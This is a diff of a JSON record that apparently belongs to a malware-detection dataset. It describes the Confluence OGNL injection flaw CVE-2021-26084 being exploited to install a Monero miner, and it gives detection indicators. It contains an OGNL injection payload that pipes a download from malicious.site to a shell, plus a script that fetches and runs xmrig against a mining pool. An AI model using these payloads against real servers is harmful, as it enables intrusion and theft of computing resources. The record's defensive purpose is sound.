@@ -1,40 +1,40 @@
 {
   "package_info": {
     "package_name": "Atlassian Confluence (CVE-2021-26084)",
-    "package_manager": "Atlassian (proprietary platform)",
-    "package_versions": "All versions prior to patched releases (e.g., 7.13.0 and earlier)",
-    "why_malicious": "The vulnerability allows attackers to execute arbitrary OGNL expressions, leading to remote code execution. Attackers exploited this to install cryptomining malware (Monero miner) on compromised servers."
+    "package_manager": "Atlassian Marketplace / Enterprise Software",
+    "package_versions": "All versions prior to patched releases (e.g., < 7.13.0)",
+    "why_malicious": "The vulnerability allows attackers to execute arbitrary OGNL expressions remotely, leading to full remote code execution. Attackers exploited this to deploy cryptomining malware (Monero miners) on compromised servers."
   },
   "malicious_snippets": [
     {
       "snippet_id": "snippet_1",
       "execution_context": {
-        "trigger": "runtime (via remote exploit of OGNL injection)",
-        "file_location": "HTTP request to vulnerable Confluence endpoint (OGNL injection point)",
+        "trigger": "runtime (via remote OGNL injection)",
+        "file_location": "HTTP request payload (OGNL expression injected into vulnerable Confluence endpoint)",
         "required_permissions": [
           "network",
           "filesystem",
           "process execution"
         ]
       },
-      "code_snippet": "OGNL expression injected via HTTP request, e.g., ${(#a=@java.lang.Runtime@getRuntime().exec('curl http://malicious.site/miner.sh | sh'))}",
+      "code_snippet": "OGNL expression injected via HTTP request, e.g.: ${(#a=@java.lang.Runtime@getRuntime().exec('curl http://malicious.site/miner.sh | sh'))}",
       "code_language": "OGNL (Object-Graph Navigation Language) / shell",
-      "code_behavior": "Executes arbitrary system commands on the Confluence server, typically to download and run a cryptominer payload.",
+      "code_behavior": "At runtime, the injected OGNL expression executes a shell command that downloads and runs a remote cryptominer installation script, resulting in unauthorized cryptomining on the server.",
       "malice_analysis": {
-        "why_suspicious": "OGNL expressions in HTTP requests should never result in code execution on the server. The ability to execute arbitrary commands is a hallmark of remote code execution attacks.",
-        "violated_expectations": "Normal Confluence endpoints should only process safe, expected input. Arbitrary code execution via user input is never legitimate.",
-        "similar_legitimate_use": "OGNL is used for data binding in Java web frameworks, but never for direct command execution from user input.",
+        "why_suspicious": "Remote code execution via user-supplied OGNL expressions is highly abnormal and dangerous, especially when used to download and execute external scripts.",
+        "violated_expectations": "Normal Confluence operation should never allow arbitrary code execution from HTTP request parameters; this is a clear violation of application security boundaries.",
+        "similar_legitimate_use": "OGNL is used for legitimate server-side expression evaluation, but never with untrusted user input.",
         "key_indicators": [
-          "OGNL payloads in HTTP requests",
-          "Unexpected process execution (e.g., curl, wget, bash) from the Confluence process",
-          "Network connections to external sites for payload retrieval"
+          "OGNL expressions in HTTP requests",
+          "Runtime.exec() calls with network downloads",
+          "Chaining of curl/wget and shell execution"
         ]
       }
     },
     {
       "snippet_id": "snippet_2",
       "execution_context": {
-        "trigger": "runtime (after successful RCE via OGNL injection)",
+        "trigger": "runtime (post-exploitation, after initial RCE)",
         "file_location": "/tmp/miner.sh (downloaded and executed by attacker)",
         "required_permissions": [
           "filesystem",
@@ -42,17 +42,17 @@
           "network"
         ]
       },
-      "code_snippet": "curl http://malicious.site/miner.sh | sh",
+      "code_snippet": "#!/bin/sh\ncurl -O http://malicious.site/xmrig && chmod +x xmrig && ./xmrig --url pool.minexmr.com:4444 --user attacker_wallet",
       "code_language": "shell",
-      "code_behavior": "Downloads and executes a shell script that installs and runs a Monero cryptominer on the compromised server.",
+      "code_behavior": "After initial exploitation, the script downloads a cryptominer binary, sets execution permissions, and launches it to mine Monero using the attacker's wallet and mining pool.",
       "malice_analysis": {
-        "why_suspicious": "Directly downloads and executes code from an untrusted external source. This is a common method for malware delivery.",
-        "violated_expectations": "Production servers should not download and execute arbitrary scripts from the internet.",
-        "similar_legitimate_use": "Automated provisioning scripts may download dependencies, but only from trusted sources and with integrity checks.",
+        "why_suspicious": "Automated download and execution of cryptomining software is a classic sign of post-exploitation malware activity.",
+        "violated_expectations": "Confluence servers should not download or run arbitrary binaries, especially cryptominers.",
+        "similar_legitimate_use": "Automated software installation scripts, but only from trusted sources and with user consent.",
         "key_indicators": [
-          "curl/wget piped to shell",
-          "Outbound connections to known cryptomining infrastructure",
-          "Unexpected long-running CPU-intensive processes"
+          "Download of xmrig or similar mining binaries",
+          "Connection to public mining pools",
+          "Execution of shell scripts from /tmp or other writable directories"
         ]
       }
     }
@@ -60,36 +60,36 @@
   "attack_chain": [
     {
       "step": 1,
-      "action": "Attacker sends a crafted HTTP request exploiting OGNL injection to achieve remote code execution.",
+      "action": "Attacker sends a crafted HTTP request exploiting the OGNL injection vulnerability to achieve remote code execution.",
       "implemented_by": [
         "snippet_1"
       ],
-      "leads_to": "Allows attacker to execute arbitrary commands on the Confluence server."
+      "leads_to": "Allows attacker to execute arbitrary shell commands on the Confluence server."
     },
     {
       "step": 2,
-      "action": "Attacker uses RCE to download and execute a cryptominer installation script.",
+      "action": "Attacker downloads and executes a cryptomining installation script on the compromised server.",
       "implemented_by": [
         "snippet_2"
       ],
-      "leads_to": "Cryptominer is installed and begins mining Monero, consuming server resources."
+      "leads_to": "Cryptominer runs on the server, using its resources to mine Monero for the attacker."
     }
   ],
   "detection_knowledge": {
     "behavioral_signatures": [
-      "Unexpected OGNL expressions in HTTP requests",
-      "Process execution from the Confluence server process (e.g., bash, curl, wget)",
-      "Outbound network connections to untrusted domains",
-      "Sudden increase in CPU usage due to cryptomining"
+      "Unexpected OGNL expressions in HTTP request parameters",
+      "Runtime.exec() or similar process execution from web application context",
+      "Outbound network connections to known cryptomining pools",
+      "Download and execution of binaries from untrusted external sources"
     ],
     "file_indicators": [
       "/tmp/miner.sh",
-      "Presence of cryptominer binaries (e.g., xmrig, minerd) in temporary or user directories"
+      "xmrig or other cryptominer binaries in temporary or application directories"
     ],
     "network_indicators": [
-      "Connections to known cryptomining pools",
+      "Connections to pool.minexmr.com or other public mining pools",
       "Outbound HTTP requests to attacker-controlled domains (e.g., malicious.site)"
     ],
-    "how_to_detect": "Monitor Confluence server logs for OGNL payloads in HTTP requests. Alert on process creation events where the parent is the Confluence process and the child is a shell, curl, wget, or known cryptominer. Watch for new or unexpected files in /tmp or user directories. Monitor for outbound connections to cryptomining pools or suspicious domains. Correlate sudden CPU spikes with new processes or network activity."
+    "how_to_detect": "Monitor web server logs for OGNL expressions in request parameters, especially those invoking Runtime.exec(). Detect unexpected process creation (e.g., xmrig, miner.sh) by the Confluence application user. Monitor for outbound connections to known cryptomining pools and suspicious domains. Alert on downloads and execution of binaries from untrusted sources."
   }
 }
